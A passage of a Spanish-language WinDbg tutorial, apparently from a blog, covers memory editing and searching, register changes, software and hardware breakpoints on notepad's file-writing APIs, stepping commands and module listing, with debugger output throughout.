&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; ?? sizeof(ntdll!_TEB)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;unsigned int 0x1000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;escritura-y-busqueda-en-la-memoria&quot;&gt;Escritura y búsqueda en la memoria&lt;a class=&quot;zola-anchor&quot; href=&quot;#escritura-y-busqueda-en-la-memoria&quot; aria-label=&quot;Anchor link for: escritura-y-busqueda-en-la-memoria&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Los mismo modificadores que se utilizan para el comando de visualización también se aplica para los de edición.&lt;&#x2F;p&gt;
&lt;p&gt;Se muestra un ejemplo modificando un &lt;code&gt;DWORD&lt;&#x2F;code&gt; que apunta a &lt;code&gt;ESP&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp L1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  775bb509
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; ed esp 42424242
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp L1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  42424242
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Al igual que con los comandos de visualización también podemos modificar directamente caracteres ASCII y unicode con &lt;code&gt;ea&lt;&#x2F;code&gt; y &lt;code&gt;eu&lt;&#x2F;code&gt; respectivamente:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp L2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  41414141 0c027ab8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; ea esp &amp;quot;Hola&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dc esp L2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  616c6f48 0c027ab8                    Hola.z..
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para poder buscar en la memoria se usa el comando &lt;code&gt;s&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Modificaremos el registro &lt;code&gt;ESP&lt;&#x2F;code&gt; para luego utilizar el comando de búsqueda:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; ed esp 41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; dd esp L2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;061afc3c  41414141 ab95988b
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para realizar una búsqueda necesitamos lo siguiente:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;El tipo de memoria a buscar.&lt;&#x2F;li&gt;
&lt;li&gt;El punto de inicio de la memoria a buscar.&lt;&#x2F;li&gt;
&lt;li&gt;La longitud de la memoria a buscar.&lt;&#x2F;li&gt;
&lt;li&gt;El patrón a buscar.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Al buscar un tipo de memoria &lt;code&gt;dword&lt;&#x2F;code&gt;, usaremos d, establecemos la longitud de búsqueda en 0, ya que queremos que busque desde el principio y que abarque todo el espacio de la memoria que se  representa con &lt;code&gt;?80000000&lt;&#x2F;code&gt;, en este caso se buscará &lt;code&gt;41414141&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; s -d 0 L?80000000 41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;061afc3c  41414141 ab95988b 775bb4d0 775bb4d0  AAAA......[w..[w
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También podemos editar los registros  mediante el comando &lt;code&gt;r&lt;&#x2F;code&gt;, que nos permite tanto mostrarlos como modificarlos:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; r
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00556000 ebx=00000000 ecx=775bb4d0 edx=04022008 esi=775bb4d0 edi=775bb4d0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=77582610 esp=061afc3c ebp=061afc68 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;----------------------------------
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; r ecx=41414141
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; r
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00556000 ebx=00000000 ecx=41414141 edx=04022008 esi=775bb4d0 edi=775bb4d0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=77582610 esp=061afc3c ebp=061afc68 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;puntos-de-interrupcion&quot;&gt;Puntos de interrupción&lt;a class=&quot;zola-anchor&quot; href=&quot;#puntos-de-interrupcion&quot; aria-label=&quot;Anchor link for: puntos-de-interrupcion&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Los puntos de interrupción se usan para detener la ejecución en ubicaciones de código deseadas.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Los puntos de interrupción controlados directamente por el depurador se conocen como puntos de interrupción de software.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Los puntos de interrupción controlados por el procesador y configurados a través del depurador se conocen como puntos de interrupción de hardware.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;puntos-de-interrupcion-de-software&quot;&gt;Puntos de interrupción de Software&lt;a class=&quot;zola-anchor&quot; href=&quot;#puntos-de-interrupcion-de-software&quot; aria-label=&quot;Anchor link for: puntos-de-interrupcion-de-software&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Al colocar un punto de interrupción WinDbg reemplaza temporalmente el código de operación de la instrucción donde queremos que se detenga la ejecución con una instrucción de ensamblador (&lt;code&gt;INT 3&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;Como seguimos con el ejemplo del notepad, vamos a poner un punto de interrupción en la API de Windows (&lt;code&gt;WriteFile&lt;&#x2F;code&gt;) que se utiliza para escribir datos en un archivo específico o un dispositivo de entrada&#x2F;salida.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bp kernel32!WriteFile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; bl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 e Disable Clear  769ed830     0001 (0001)  0:**** KERNEL32!WriteFile
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En estos momentos está activado, cuando intentemos guardar el documento, habremos llegado al punto de interrupción:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=02bdebd0 ebx=00000000 ecx=00000006 edx=00000000 esi=00000006 edi=08504000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=769ed830 esp=02bdebb0 ebp=02bdebe4 iopl=0         nv up ei pl nz na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNEL32!WriteFile:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;769ed830 ff252495a476    jmp     dword ptr [KERNEL32!_imp__WriteFile (76a49524)] ds:0023:76a49524={KERNELBASE!WriteFile (75558f20)}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para habilitar y deshabilitar los puntos de interrupción, es de la siguiente forma:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; bd 0 &#x2F;&#x2F; deshabilitar
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; bl 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     0 d Enable Clear  769ed830     0001 (0001)  0:**** KERNEL32!WriteFile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; be 0 &#x2F;&#x2F; habilitar
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; bl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     0 e Disable Clear  769ed830     0001 (0001)  0:**** KERNEL32!WriteFile
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para borrarlo por completo es:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; bl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     0 e Disable Clear  769ed830     0001 (0001)  0:**** KERNEL32!WriteFile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; bc 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; bl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; nothing
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También existen los puntos de interrupción no resueltos que se usan mediante &lt;code&gt;bu&lt;&#x2F;code&gt;, las diferencias entre uno resuelto y no resuelto es al siguiente:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Puntos de interrupción resueltos:&lt;&#x2F;strong&gt;
Son aquellos puntos de interrupción que el depurador ha localizado con éxito en el código fuente y que están listos para ser utilizados durante la depuración.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Puntos de interrupción no resueltos:&lt;&#x2F;strong&gt;
Son aquellos puntos de interrupción que el depurador no puede localizar en el código fuente.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Causas:&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;La línea de código especificada no existe en el archivo.
- El depurador no tiene acceso al archivo o al código fuente.
- Cambios en el código fuente después de establecer el punto de interrupción (por ejemplo, la línea se movió o se eliminó).
- Problemas con el proceso de compilación o con el entorno de depuración.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Para poder cargarlos primero hay que cargar la lista de módulos &lt;code&gt;lm m ole32&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; bu OLE32!WriteStringStream
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; bl
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Después de reanudar al ejecución observamos que se ha cargado &lt;code&gt;OLE32.dll:&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ModLoad: 77400000 7743000 C:\Windows\System32\ole32.dll 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También es importante recalcar que aunque el punto de interrupción se resuelva al cargar el &lt;code&gt;dll&lt;&#x2F;code&gt;, no se activo debido a que no se forzó una llamada a &lt;code&gt;ole32!WriteStringStream&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;puntos-de-interrupcion-de-hardware&quot;&gt;Puntos de interrupción de Hardware&lt;a class=&quot;zola-anchor&quot; href=&quot;#puntos-de-interrupcion-de-hardware&quot; aria-label=&quot;Anchor link for: puntos-de-interrupcion-de-hardware&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Los puntos de interrupción del hardware o del procesador son manejados por el procesador y almacenados en los registros de depuración del procesador. Pueden detener la ejecución del código cuando se realiza un tipo particular de acceso, como lectura, escritura o ejecución, a una ubicación de memoria específica.&lt;&#x2F;p&gt;
&lt;p&gt;La principal ventaja de los puntos de interrupción de hardware es que permiten supervisar los cambios o acceder a los datos en memoria.&lt;&#x2F;p&gt;
&lt;p&gt;En el siguiente ejemplo, vamos a establecer un punto de interrupción de hardware en la ejecución de &lt;code&gt;WriteFile&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;El resultado es equivalente a establecer un punto de interrupción de software, pero en este caso, aprovechamos la CPU y los registros de depuración, en lugar de modificar el código con una instrucción INT 3.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 1 = Solo un byte
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ba e 1 kernel32!WriteFile;g
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Al guardar el archivo llegamos al punto de interrupción:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00a5ecd0 ebx=00000000 ecx=00000007 edx=00000000 esi=00000007 edi=07feb800
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=7629d830 esp=00a5ecb0 ebp=00a5ece4 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNEL32!WriteFile:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;7629d830 ff2524952f76    jmp     dword ptr [KERNEL32!_imp__WriteFile (762f9524)] ds:0023:762f9524={KERNELBASE!WriteFile (756f8f20)}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como se muestra en el código  anterior, cuando se alcanza el punto de interrupción, la salida es idéntica a la que se obtiene a través de un punto de interrupción de software.&lt;&#x2F;p&gt;
&lt;p&gt;También se puede recorrer el código de diferentes maneras, ya sea con &lt;code&gt;p&lt;&#x2F;code&gt;, &lt;code&gt;t&lt;&#x2F;code&gt;, &lt;code&gt;pt&lt;&#x2F;code&gt; o &lt;code&gt;ph&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;p&lt;&#x2F;code&gt; - &lt;strong&gt;Step Over&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;:000&amp;gt; bp kernelbase!CreateFileW+0x53
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; bl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     0 e Disable Clear  75660de0     0001 (0001)  0:**** KERNELBASE!CreateFileW
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     1 e Disable Clear  75660e33     0001 (0001)  0:**** KERNELBASE!CreateFileW+0x53
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 1 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=02a7da08 ebx=00000000 ecx=02a7dca0 edx=80000000 esi=80000000 edi=00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=75660e33 esp=02a7da00 ebp=02a7da24 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNELBASE!CreateFileW+0x53:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75660e33 ff7518          push    dword ptr [ebp+18h]  ss:0023:02a7da3c=00000003
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;t&lt;&#x2F;code&gt; - &lt;strong&gt;Step Into&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; t
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=02ead770 ebx=00000000 ecx=02eada08 edx=80000000 esi=80000000 edi=00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=75660e39 esp=02ead760 ebp=02ead78c iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNELBASE!CreateFileW+0x59:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75660e39 e812000000      call    KERNELBASE!CreateFileInternal (75660e50)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Podemos usar los comandos &quot;step into&quot; y &quot;step over&quot; indistintamente, excepto cuando encontramos una instrucción de llamada . En el siguiente código se ejecuta el mismo fragmento de código, pero en su lugar, pasamos por encima de la llamada.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=0008dcc0 ebx=00000000 ecx=0008df58 edx=80000000 esi=80000000 edi=00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=75660e39 esp=0008dcb0 ebp=0008dcdc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNELBASE!CreateFileW+0x59:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75660e39 e812000000      call    KERNELBASE!CreateFileInternal (75660e50)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Aquí observamos que con el comando &lt;code&gt;p&lt;&#x2F;code&gt; continuaremos a través de la aplicación sin tomar ningún desvío a través de funciones anidadas. Otro comando conveniente es &lt;code&gt;pt&lt;&#x2F;code&gt; (paso al siguiente retorno), que nos permite avanzar rápidamente hasta el final de
una función.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; pt
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=000004b0 ebx=00000000 ecx=fe931c84 edx=00000000 esi=80000000 edi=00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=75660e41 esp=02a9dc70 ebp=02a9dcfc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNELBASE!CreateFileW+0x61:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75660e41 c21c00          ret     1Ch
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Al igual que el comando &lt;code&gt;pt&lt;&#x2F;code&gt; , &lt;code&gt;ph&lt;&#x2F;code&gt; ejecuta código hasta que se alcanza una instrucción de ramificación. Esto incluye ramificaciones condicionales o incondicionales, llamadas a funciones e instrucciones de retorno.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:000&amp;gt; ph
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000000 ebx=00000000 ecx=00000000 edx=0303dad0 esi=80000000 edi=00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=75660e11 esp=0303d838 ebp=0303d854 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNELBASE!CreateFileW+0x31:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75660e11 7531            jne     KERNELBASE!CreateFileW+0x64 (75660e44)  [br=0]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;otras-funciones-de-windbg&quot;&gt;Otras funciones de WinDbg&lt;a class=&quot;zola-anchor&quot; href=&quot;#otras-funciones-de-windbg&quot; aria-label=&quot;Anchor link for: otras-funciones-de-windbg&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Listar los módulos y símbolos:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; lm
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00100000 0012e000   notepad    (pdb symbols)          C:\ProgramData\Dbg\sym\notepad.pdb\ADBDBE4C7390D98531FB4768CE6821011\notepad.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;5cec0000 5cf5b000   efswrt     (deferred)             
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;624e0000 62533000   oleacc     (deferred)             
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;64b50000 64be4000   TextShaping   (deferred)             
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;64e20000 65030000   COMCTL32   (deferred)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En el código anterior no se cargan los símbolos, por lo tanto con &lt;code&gt;.reload &#x2F;f&lt;&#x2F;code&gt; , se volverían a listar los módulos:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; lm
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00100000 0012e000   notepad    (pdb symbols)          C:\ProgramData\Dbg\sym\notepad.pdb\ADBDBE4C7390D98531FB4768CE6821011\notepad.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;5cec0000 5cf5b000   efswrt     (pdb symbols)          C:\ProgramData\Dbg\sym\efswrt.pdb\B03D277C5AAF0B084B893255559BA4871\efswrt.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;624e0000 62533000   oleacc     (pdb symbols)          C:\ProgramData\Dbg\sym\oleacc.pdb\0D7A0ADA8E052DAA048EBE8BC61062071\oleacc.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;64b50000 64be4000   TextShaping   (pdb symbols)          C:\ProgramData\Dbg\sym\TextShaping.pdb\1B139FA8DD359F8159D13590F130DD951\TextShaping.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;64e20000 65030000   COMCTL32   (pdb symbols)          C:\ProgramData\Dbg\sym\comctl32.pdb\58ED30050F718EF61105AECF9CA8E1531\comctl32.pdb
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También se puede usar &lt;code&gt;*&lt;&#x2F;code&gt; modo de filtro, por ejemplo para buscar todos los módulos que empiecen con Kernel.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; lm m kernel*
